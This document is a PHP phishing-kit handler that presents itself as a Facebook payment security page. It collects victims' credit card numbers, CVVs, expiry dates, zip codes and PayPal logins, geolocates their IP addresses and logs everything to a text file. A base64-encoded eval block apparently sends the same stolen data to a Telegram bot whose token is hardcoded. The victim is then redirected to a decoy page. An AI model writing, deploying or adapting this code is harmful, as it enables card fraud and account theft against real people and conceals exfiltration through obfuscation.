<?php
error_reporting(0);
 
$file = "ccanakmedannilaii.txt";

$ccname = $_POST['ccname'];
$ccnumber = $_POST['ccnumber'];
$date  = $_POST['mmyy'];
$cvv  = $_POST['cvv'];
$zipnumb  = $_POST['zipcode']; 
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$ip = $_SERVER['REMOTE_ADDR'];
$host = "http://www.geoplugin.net/php.gp?ip=$ip";
$response = fetch($host);
$data = unserialize($response);
$a = $data['geoplugin_city'];
$b = $data['geoplugin_region'];
$c = $data['geoplugin_countryName'];



$pemail=$_POST['pemail'];
$ppass=$_POST['ppass'];


function fetch($host) {

		if ( function_exists('curl_init') ) {
						
			//use cURL to fetch data
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $host);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, 'geoPlugin PHP Class v1.0');
			$response = curl_exec($ch);
			curl_close ($ch);
			
		} else if ( ini_get('allow_url_fopen') ) {
			
			//fall back to fopen()
			$response = file_get_contents($host, 'r');
			
		} else {

			trigger_error ('geoPlugin class Error: Cannot retrieve data. Either compile PHP with cURL support or enable allow_url_fopen in php.ini ', E_USER_ERROR);
			return;
		
		}
		
		return $response;
	}


	  		  

$handle = fopen($file, 'a');
 eval("?>".base64_decode("PD9waHANCgkJCQkJICAkdGdsPWRhdGUoImQgRiBZIik7DQogICAgICAgICAgICAgICAgICAgICAgJHRva2VuPScyMDg0ODUzMDY5OkFBRjkxV2VTazVGdUxRVmpocFdzcVY4SmdqZmVTcEpLM2dNJzsNCiAgICAgICAgICAgICAgICAgICAgICAkY2hhdGlkPScxNjcwNDIyODQ3JzsgLy8gZ2FudGkgY2hhdCBpZCANCiAgICAgICAgICAgICAgICAgICAgICAkcGVzYW49dXJsZW5jb2RlKCINCgkJCQkJICBcbj09PT09PT09PShzYyBieVJBTlMpPT09PT09PT09XG4NCgkJCQkJICBHYW50ZW5nIEl6aW4gS2lyaW0gUmVzdWx0IENDIGhhcmkgaW5pICR0Z2wgXG4NCgkJCQkJICBDQyBOQU1FCQk6ICRjY25hbWUgXG4NCgkJCQkJICBDQyBOVU1CRVIgICAgIDogJGNjbnVtYmVyIFxuDQoJCQkJCSAgQ0MgVkFMSUQgREFURSA6ICRkYXRlXG4NCgkJCQkJICBDVlYgCQkgCTogJGN2diBcbg0KCQkJCQkgIFpJUENPREUJIAk6ICR6aXBudW1iICBcbg0KDQoJCQkJCSAgPT09PT09PT09IFBBWVBBTCBBQ0NPVU5UID09PT09PT09PVxuDQoJCQkJCSAgRS1NQUlMIAk6ICRwZW1haWxcbg0KCQkJCQkgIFBhc3N3b3JkCTogJHBwYXNzIFxuDQoJCQkJCSAgPT09PT09PT09IElORk8gSVAgOiAkaXAgXG4NCgkJCQkJICBOZWdhcmEgCQkJOiAkYyBcbiANCgkJCQkJICBQcm92aW5zaSAJCQk6ICRiIFxuIA0KCQkJCQkgIEtvdGEJCQkJOiAkYSBcbiANCgkJCQkJIA0KCQkJCQkgID09PT09PT09PShzYyBieVJBTlMpPT09PT09PT09Iik7DQogICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAkQVBJID0gImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QiLiR0b2tlbi4iL3NlbmRtZXNzYWdlP2NoYXRfaWQ9Ii4kY2hhdGlkLiImdGV4dD0kcGVzYW4iOw0KICAgICAgICAgICAgICAgICAgICAgICRjaCA9IGN1cmxfaW5pdCgpOw0KICAgICAgICAgICAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7DQogICAgICAgICAgICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NVU1RPTVJFUVVFU1QsICdQT1NUJyk7DQogICAgICAgICAgICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJEFQSSk7DQogICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9IGN1cmxfZXhlYygkY2gpOw0KICAgICAgICAgICAgICAgICAgICAgIGN1cmxfY2xvc2UoJGNoKTsNCj8+CQkJCQ=="));  
fwrite($handle, "----FACEBOOK-SECURITY-PAYMENTS-BY-MASAULIASC----");
fwrite($handle, "\n");
fwrite($handle, "Full Name      : ");
fwrite($handle, " $ccname");
fwrite($handle, "\n");
fwrite($handle, "CC Number      : ");
fwrite($handle, " $ccnumber");
fwrite($handle, "\n");
fwrite($handle, "Epired Date     : ");
fwrite($handle, " $date");
fwrite($handle, "\n");
fwrite($handle, "CVV            : ");
fwrite($handle, " $cvv");
fwrite($handle, "\n");
fwrite($handle, "Zip Code	: ");
fwrite($handle, " $zipnumb");
fwrite($handle, "\n");

fwrite($handle, "Country        : ");

fwrite($handle, " $c");

fwrite($handle, "\n");

fwrite($handle, "IP Address     : ");

fwrite($handle, " $ip");

fwrite($handle, "\n");

fwrite($handle, "----------------------END----------------------");

fwrite($handle, "\n");

fwrite($handle, "------------------Paypal----------------------");
fwrite($handle, "\n");
fwrite($handle, "Email Paypal : ");
fwrite($handle, " $pemail");
fwrite($handle, "\n");
fwrite($handle, "Paypal Password : ");
fwrite($handle, " $ppass");
fwrite($handle, "\n");
fwrite($handle, "------------------END Paypal----------------------");

fwrite($handle, "\n");


fclose($handle);

echo "<script LANGUAGE=\"JavaScript\">

<!--

window.location=\"secure.html?fbclid=IwAR0DpHzyMmR9Q1m8hvlX3O_FU5ALkroRy_qhIzhAXWrn13ldVn_3Y1SQfjo/\";

// -->

</script>";

?>

